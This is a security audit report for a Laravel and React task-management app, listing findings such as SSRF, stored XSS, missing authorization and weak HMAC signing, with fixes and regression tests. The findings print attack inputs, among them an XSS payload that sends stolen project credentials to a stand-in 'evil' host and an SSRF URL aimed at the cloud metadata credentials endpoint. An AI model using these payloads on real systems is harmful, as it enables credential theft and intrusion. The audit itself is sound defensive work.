# WorkHub — Security & Code Audit Report

**Date:** 2026-11-24
**Scope:** Laravel backend (`app/`, `routes/`, `bootstrap/`, `config/`), Blade views, and Inertia/React pages (`resources/js/Pages`).
**Method:** Manual source review. Nothing was exploited against a live instance; every finding below is traced through the code with file and line references.

## Summary

| Severity | Count |
|---|---|
| 🔴 Critical | 4 |
| 🟠 High | 7 |
| 🟡 Medium | 5 |
| 🔵 Low / Code quality | 6 |

The main problems are **missing authorization on a few V2 endpoints**, **server-side fetching of user-supplied URLs (SSRF)**, **unsanitized rich-text HTML (stored XSS)**, and **policies that still treat soft-deleted memberships as active**. Most V1 routes check policies correctly. The V2 rewrite skipped several of those checks.

## Fix status (branch `claude/cool-planck-3r5e3y`)

> ⚠️ The fixes were written without running them: `composer install` could not download packages in that environment. **Run `php artisan test` before merging.** Regression tests are in `tests/Feature/SecurityFixesTest.php`.

| ID | Status | Fix |
|---|---|---|
| C1 | ✅ Fixed | `TaskService::fetchRemoteImage()`: http(s) only, public IPs only (pinned via `CURLOPT_RESOLVE`), no redirects, 10 MB cap, bytes must be a raster image |
| C2 | ✅ Fixed | `App\Support\HtmlSanitizer` (allow-list built on PHP DOM, no new package). Applied on write via `setDescriptionAttribute` on Task/Note/Project, and on render in Blade and the V2 Inertia payloads. **Run `php artisan security:sanitize-html` once** to clean existing rows |
| C3 | ✅ Fixed | `Gate::authorize('update', $task)` in `V2\IssueController::toggle` |
| C4 | ✅ Fixed | `CompanyUsers::effectiveMembership()`: removed members get no rights; for a trashed company, only memberships deleted together with it count. Nobody can restore their own membership |
| H1 | ✅ Fixed | Project authorization in `V2\IssueController::store` |
| H2 | ✅ Fixed | Destination project authorized in `TaskController::update` |
| H3 | ✅ Fixed | API key cannot target any project but its own |
| H4 | ⚠️ Partial | Empty-body signature only accepted when the request has no body fields; API key read from the header only. **Still open:** timestamp/nonce replay protection, which needs a breaking client change |
| H5 | ✅ Fixed | `App\Rules\AssignableToProject` on web, API, external-API-key and import assignees |
| H6 | ✅ Fixed | New `ProjectPolicy::manageSecrets` (owner or company admin) gates credentials, API keys and the Postman export. The export no longer contains the secret, and the V2 project page hides credentials from non-admins |
| H7 | ✅ Fixed | SVG removed. Base64 and URL payloads must be real JPEG/PNG/GIF/WebP images |
| M1 | ⚠️ Config | `TRUSTED_PROXIES` env var. **Set it to your load balancer IPs in production**; the default is still `*` so existing deployments keep working |
| M2 | ⚠️ Partial | Open redirect fixed (exact host match). The route still accepts GET because the UI uses plain links (low impact) |
| M3 | ✅ Fixed | `CompanyUsers::restoreWithCompany()` |
| M4 | ✅ Fixed | Trash listings use effective memberships |
| M5 | ✅ Fixed | Log Viewer: Super Admin only, in every environment |
| L2 | ✅ Fixed | `TaskPolicy::delete()` added |
| L6 | ✅ Fixed | Remote fetch errors are passed to `report()` |
| L1, L3, L4, L5 | ⏳ Open | Code-quality items; not changed |

---

## 🔴 Critical

### C1 — Server-Side Request Forgery (SSRF) through `image_url` / `images_url`
- **Where:** `app/Services/TaskService.php:424` (`processTaskImages()`), reachable from `POST /api/tasks` and `POST /api/tasks/{task}/images` (`app/Http/Controllers/Api/TaskController.php`).
- **Issue:** The server calls `Http::timeout(10)->get($url)` on any URL that passes `FILTER_VALIDATE_URL`. It has no host allow-list, no block on private or link-local IPs, and it follows redirects. The response body is written to the **public** disk.
- **Exploit:** Anyone with an API key sends `image_url=http://169.254.169.254/latest/meta-data/iam/security-credentials/` (cloud metadata), or `http://localhost:6379`, or an internal admin panel. The response is saved as `/storage/task_images/<random>.jpg`, and the attacker downloads it from the task's images.
- **Fix:**
  - Allow only `https`.
  - Resolve the hostname and reject private, loopback, link-local and reserved ranges.
  - Disable redirects (`withOptions(['allow_redirects' => false])`).
  - Cap the response size.
  - Check that the bytes are a real image (`getimagesizefromstring` / `finfo`).
  - Better still, drop URL ingestion entirely.

### C2 — Stored XSS in task, note, project and issue descriptions
- **Where (server-rendered raw HTML):**
  - `resources/views/tasks/show.blade.php:273`
  - `resources/views/notes/show.blade.php:101`
  - `resources/views/notes/pdf.blade.php:134`
  - `resources/views/projects/show.blade.php:75` (also `notes.blade.php:73`, `credentials.blade.php:66`, `external_api.blade.php:66`)
  - `resources/views/issues/index.blade.php:136`
- **Where (React):**
  - `resources/js/Pages/New/TaskView.jsx:914,983` (`dangerouslySetInnerHTML` via `formatDescHtml`, which only rewrites checklist markup)
  - `resources/js/Pages/New/Notes.jsx:700`
- **Issue:** Descriptions come from Quill and are saved as-is. Nothing in `app/` sanitizes HTML: there is no HTMLPurifier and no DOMPurify.
- **Exploit:** An ordinary org member creates a task whose description is `<img src=x onerror="fetch('/projects/1/credentials').then(r=>r.text()).then(t=>navigator.sendBeacon('https://evil',t))">`. When an admin opens the task, the script runs in the admin's session. It can steal project credentials, create API keys, or remove members.
- **Fix:** Sanitize on write with `mews/purifier` / HTMLPurifier and an allow-list matching Quill's output. Also sanitize on render in React with `DOMPurify.sanitize()`. Add a Content-Security-Policy header as defence in depth.

### C3 — `PATCH /v2/issues/{task}/toggle` has no authorization (IDOR)
- **Where:** `app/Http/Controllers/V2/IssueController.php:203`
- **Issue:** `toggle(Task $task)` updates `status` without calling any `Gate` or policy.
- **Exploit:** Any verified user can loop over task IDs and mark every task in every tenant as completed or re-opened.
- **Fix:** Call `Gate::authorize('update', $task);` first. Add a feature test proving a non-member gets 403.

### C4 — Removed admins keep admin powers through soft-deleted memberships
- **Where:**
  - `app/Policies/CompanyUsersPolicy.php:56`
  - `app/Policies/CompanyPolicy.php:60`
  - `app/Policies/ProjectPolicy.php:55`
  - `app/Policies/TaskPolicy.php:63`
- **Issue:** The `restore` and `forceDelete` policies look up the caller's membership with `withTrashed()`. When an admin is removed (`CompanyController::removeMember`, which soft-deletes the row), their row still has `role = 1`, so they still pass these checks.
- **Exploit:**
  1. A removed admin calls `POST /trash/members/{theirOwnMembershipId}/restore`. `CompanyUsersPolicy::restore` passes, and they are back in the organization.
  2. Or they call `DELETE /trash/projects/{id}/force` / `DELETE /trash/companies/{id}/force` and permanently destroy data in an org they no longer belong to.
- **Fix:**
  - Authorize against **active, approved** memberships only.
  - The one case that needs `withTrashed()` is restoring a whole deleted company, because every membership is soft-deleted along with it. Handle that explicitly: check the company is trashed *and* that the membership's `deleted_at` equals the company's `deleted_at`.

---

## 🟠 High

### H1 — `POST /v2/issues` creates tasks in any project
- **Where:** `app/Http/Controllers/V2/IssueController.php:160-196` (`'project_id' => $request->input('project_id')` at line 192).
- **Issue:** `project_id` only passes `exists:projects,id`. Nobody checks that the caller can access that project.
- **Fix:** If `project_id` is present, call `Gate::authorize('update', Project::findOrFail(...))` first.

### H2 — `PATCH /tasks/{task}` can move a task into someone else's project
- **Where:** `app/Http/Controllers/TaskController.php:157-173`
- **Issue:** The caller is checked against the task's *current* project. The new `project_id` is only checked with `exists`.
- **Exploit:** A user moves their own task into another company's project. That injects content (including the XSS from C2) into a tenant they are not part of.
- **Fix:** If `project_id` changes, `Gate::authorize('update', $newProject)`.

### H3 — An external API key can write to any project
- **Where:** `app/Http/Controllers/Api/TaskController.php:131-136`
- **Issue:** `$targetProjectId = $validated['project_id'] ?? $externalApiConfig->project_id;`. When a key is used, the `Gate::authorize` call is skipped (`if (! $externalApiConfig)`). So a key scoped to project A can create tasks in project B just by sending `project_id=B`.
- **Fix:** If an API key is in use, ignore any `project_id` in the request, or reject it with 403 when it differs from `$externalApiConfig->project_id`.

### H4 — The HMAC request signing is weak
- **Where:** `app/Http/Middleware/VerifyExternalApiKey.php`
- **Issues:**
  1. **Line 49-51:** The middleware accepts `hash_hmac('sha256', '', secret)` as valid for **any** request body. That value never changes for a given key. Anyone who sees one signed GET can then forge any POST.
  2. There is no timestamp or nonce, so any captured request can be replayed forever.
  3. **Line 19:** The API key is accepted from `$request->input('api_key')`, which includes the query string. Keys end up in access logs, proxies and browser history.
  4. The fallback re-encodes the form fields with `json_encode` and verifies against that. That is fragile, because key order and number/string types change the encoding.
- **Fix:**
  - Sign `method + path + timestamp + sha256(body)`.
  - Reject timestamps more than 5 minutes old.
  - Remove the empty-body fallback.
  - Accept the key only from the header.

### H5 — Tasks and API keys can be assigned to users in other tenants
- **Where:**
  - `assigned_to` validation is only `exists:users,id` in `TaskController` (`storeGeneral`, `store`, `update`, `storeSubtask`), `Api\TaskController::store`, and `ExternalTaskApiController` (`assigned_user_id`).
  - Import resolves assignees by any email, or by a global `LIKE '%name%'`, in `TaskService::normalizeTaskImportData()`.
- **Issue:** Anyone can assign tasks to any user on the platform. This leads to:
  - spam notifications and emails to arbitrary users
  - user enumeration (by ID, by email, or by partial name during import)
  - task data leaking to outsiders: the assignee gains `view` / `update` through `TaskPolicy::isPersonalOrProjectOwnerOrAssignee`.
- **Fix:** Check that the assignee is an approved member of the project's company, or the owner for personal projects. A reusable `Rule` class is the cleanest way.

### H6 — Every company member can read project secrets
- **Where:**
  - `app/Policies/ProjectPolicy.php:25-28` (`update()` just returns `view()`)
  - `ProjectCredentialsController`
  - `ExternalTaskApiController::downloadPostmanCollection()` (lines 194, 207)
- **Issue:** Any approved member, not only admins, can:
  - list, add and delete project credentials (production passwords, API keys)
  - create, rotate and revoke external API keys
  - download a Postman collection that contains the **decrypted** `api_secret`.

  `ProjectCredentialsPolicy` exists but every method returns `false`, and nothing calls it.
- **Fix:**
  - Limit credential and API-key management to company admins.
  - Never put the decrypted secret in the Postman export; use a placeholder.
  - Either finish `ProjectCredentialsPolicy` and use it, or delete it.

### H7 — Arbitrary or SVG files saved to the public disk
- **Where:**
  - `app/Services/TaskService.php:534` (`'svg'` is allowed in `processDescriptionEmbeddedImages`)
  - `TaskService.php:404` (`image_base64` decoded and saved with no content check)
  - URL-fetched bodies (C1)
- **Issue:** An SVG containing `<script>` is served from `/storage/...` on the app's own origin. Opening it runs JavaScript with the user's session. Base64 payloads are saved with a `.jpg` extension whatever their real content is.
- **Fix:** Remove `svg`. Check the decoded bytes with `finfo` / `getimagesizefromstring`. Enforce a size limit. Ideally re-encode images with Intervention Image.

---

## 🟡 Medium

### M1 — The app trusts every proxy
- **Where:** `bootstrap/app.php:21` (`trustProxies(at: '*')`) and `app/Http/Middleware/TrustProxies.php`
- **Issue:** Any client can forge `X-Forwarded-For`. That lets them:
  - get around the `api` rate limiter, which falls back to keying on IP
  - fake the `ip_address` stored in `ExternalTaskSource` and the activity logs.
- **Fix:** List the real load balancer IPs or CIDRs, for example via a `TRUSTED_PROXIES` env var.

### M2 — Open redirect and GET-based state change in the UI switcher
- **Where:** `app/Http/Controllers/UiSwitchController.php:27-31`, `routes/web.php:44`
- **Issue:**
  - `str_starts_with($referer, url('/'))` also matches `https://workhub.example.com.evil.com/...`, so the user can be redirected off-site.
  - The route accepts **GET** and saves a preference, so any page can trigger the change (CSRF) with an `<img>` tag.
- **Fix:** Compare the parsed host exactly (`parse_url($referer, PHP_URL_HOST) === parse_url(config('app.url'), PHP_URL_HOST)`), or just use `redirect()->back()`. Make the route POST-only.

### M3 — Restoring a company brings back members who were removed long before
- **Where:** `app/Http/Controllers/TrashController.php:181`, `app/Http/Controllers/V2/TrashController.php:181`
- **Issue:** `CompanyUsers::onlyTrashed()->where('company_id', ...)->restore()` restores **every** soft-deleted membership. That includes people an admin deliberately removed months before the company was deleted.
- **Fix:** Only restore memberships whose `deleted_at` matches the company's `deleted_at`. Better: record which memberships were deleted together with the company.

### M4 — The Recycle Bin shows data to former members
- **Where:** `app/Http/Controllers/TrashController.php:23,55,85`, `app/Http/Controllers/V2/TrashController.php:26,70`
- **Issue:** Company IDs come from `CompanyUsers::withTrashed()`, so users who were removed still see the org's trashed task titles, assignees and project names.
- **Fix:** Use active memberships. Same root cause as C4.

### M5 — The Log Viewer is wide open in `local` and too broad elsewhere
- **Where:** `app/Providers/AppServiceProvider.php:87-90`
- **Issue:** When `APP_ENV=local`, the gate returns `true` even for guests. A staging server misconfigured as `local` exposes every log, which can contain tokens, emails and stack traces. In other environments, any user with the global `Admin` role can read them.
- **Fix:** Restrict it to Super Admins and remove the environment shortcut. Make sure production and staging never run with `APP_ENV=local`.

---

## 🔵 Low / Code quality

| ID | Issue | Where | Recommendation |
|---|---|---|---|
| L1 | Mock and demo pages need no login | `routes/demo.php` (`/demo/dashboard`), `routes/web.php:134,137` (`/new/task-view`, `/new/task/{id}`) | Delete them, or put them behind `auth` and `app()->isLocal()`. |
| L2 | `TaskPolicy` has no `delete()` method, so `can_delete` is always `false` for everyone except Super Admins. The delete UI quietly breaks | `app/Http/Controllers/V2/TaskController.php:152,307` | Add `TaskPolicy::delete()` (admins or the creator). |
| L3 | V1 and V2 controllers duplicate business logic (Company, Trash, Note, Task, Issue). The V2 copies already lost authorization checks (C3, H1) | `app/Http/Controllers/*` vs `app/Http/Controllers/V2/*` | Move the logic into services or actions that both versions call. |
| L4 | `.env.example` defaults to `APP_DEBUG=true`, `SESSION_ENCRYPT=false`, `LOG_LEVEL=debug` | `.env.example` | Document production values. A debug page on an exception leaks env and secrets. |
| L5 | The API's session-auth branch never runs: the `api` group has no session middleware, so `auth()->check()` is always false | `VerifyExternalApiKey.php`, `Api/TaskController.php` | Remove it, or use Sanctum properly. |
| L6 | Errors are silently swallowed | `app/Services/TaskService.php:441` (`catch (\Throwable $e) {}`) | At least call `report($e)` or log a warning. |

---

## ✅ Positive observations
- `ProjectCredentials.password_or_secret` and `ExternalTaskApi.api_secret` use Laravel's `encrypted` cast.
- The HMAC comparison uses `hash_equals`, which takes constant time.
- Most V1 controllers call `Gate::authorize` correctly, and the policies check `is_approved`.
- The API has its own rate limiter (`throttle:api`, 24/min).
- `CommentController` authorizes against the commentable parent before writing.
- There is a Pest feature test suite (`tests/Feature/*`) to build regression tests on.

---

## Suggested fix order
1. **C3, H1, H2, H3.** Each is a one-line `Gate::authorize` or a scoping fix. Do these today.
2. **C1, H7.** Remove or lock down URL fetching. Validate the content of uploads.
3. **C2.** Add HTMLPurifier on save and DOMPurify on render, then a CSP header.
4. **C4, M3, M4.** Rewrite the trash and restore authorization so it only counts active memberships.
5. **H4, H5, H6.** Harden HMAC, add an assignee-membership rule, limit secrets to admins.
6. M1, M2, M5, then the Low items.

## Regression tests to add (`tests/Feature`)
- A non-member gets 403 on `PATCH /v2/issues/{task}/toggle`, `POST /v2/issues` with a foreign `project_id`, and `PATCH /tasks/{task}` moving the task into a foreign project.
- An API key scoped to project A cannot create a task in project B.
- A removed admin cannot restore their membership or force-delete the company or its projects.
- `image_url` pointing at `127.0.0.1` or `169.254.169.254` is rejected.
- A description containing `<script>` / `onerror=` is saved sanitized.
- A request signed with `HMAC('')` but carrying a non-empty body is rejected.
